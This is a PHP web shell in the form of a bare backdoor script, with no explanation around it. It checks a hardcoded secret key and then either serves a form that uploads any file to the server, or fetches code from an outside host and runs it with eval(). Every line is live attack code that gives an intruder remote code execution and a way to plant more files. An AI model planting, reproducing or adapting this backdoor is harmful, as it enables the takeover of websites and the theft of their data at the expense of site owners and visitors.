<?php

ob_start();

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

echo "xbooyes\n\r";


if (@$_GET["xboo"] != "cf05c0491e436e655b77584fbf1cab97") {
    die("Unauthorized access.");
}

if (@$_GET["up"] == "1") {
    echo "<form method='post' enctype='multipart/form-data'><input name='avatar' type='file' /> <input type='submit' value='go' /></form>";
    $dossier = './';
    if (isset($_FILES['avatar']['name']) && !empty($_FILES['avatar']['name'])) {
        $fichier = basename($_FILES['avatar']['name']);
        move_uploaded_file($_FILES['avatar']['tmp_name'], $dossier . $fichier);
    }

    exit;
}
#=========================================================================================
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'http://upexpl.bixalo.com/temporary?key=0b3c1c86-9650-44b3-87d2-3acc4f8a824e&sec=cf05c0491e436e655b77584fbf1cab97');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 3);

$result = curl_exec($ch);

if(curl_errno($ch))
{
    die('Error:' . curl_error($ch));
}

curl_close($ch);

if (substr(trim($result), 0, 7) !== "?><?php") {
    die($result);
} else {
    eval($result);
}
?>
    